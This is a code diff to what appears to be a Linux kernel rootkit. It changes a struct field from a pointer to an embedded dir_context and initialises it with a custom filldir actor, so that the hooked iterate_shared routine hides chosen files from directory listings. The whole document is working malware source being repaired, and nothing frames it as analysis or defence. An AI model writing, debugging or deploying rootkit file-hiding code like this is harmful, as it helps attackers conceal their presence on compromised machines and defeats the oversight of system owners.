@@ -73,7 +73,7 @@ struct hidden_file {
     struct file_operations* backup_fops;
     struct inode* inode;
     struct dir_context* backup_ctx;
-    struct dir_context* bad_ctx;
+    struct dir_context bad_ctx;
     char name[PATH_MAX];
 };
 static struct hidden_file hidden_files[256];
@@ -629,10 +629,10 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     for (i = 0; i < hidden_file_count; ++i) {
         if (file->f_inode == hidden_files[i].inode) {
             //Inodes match, use this context
-            hidden_files[i].bad_ctx->pos = ctx->pos;
+            hidden_files[i].bad_ctx.pos = ctx->pos;
             hidden_files[i].backup_ctx = ctx;
-            result = hidden_files[i].backup_fops->iterate_shared(file, hidden_files[i].bad_ctx);
-            ctx->pos = hidden_files[i].bad_ctx->pos;
+            result = hidden_files[i].backup_fops->iterate_shared(file, &hidden_files[i].bad_ctx);
+            ctx->pos = hidden_files[i].bad_ctx.pos;
             return result;
         }
     }
@@ -676,6 +676,12 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
     hf->backup_fops = hf->inode->i_fop;
     hf->fops.iterate_shared = rk_iterate_shared;
     hf->inode->i_fop = &hf->fops;
+
+    struct dir_context d = {
+            .actor = rk_filldir_t,
+    };
+
+    memcpy(&hf->bad_ctx, &d, sizeof(struct dir_context));
 
     strcpy(hf->name, user_file);
 
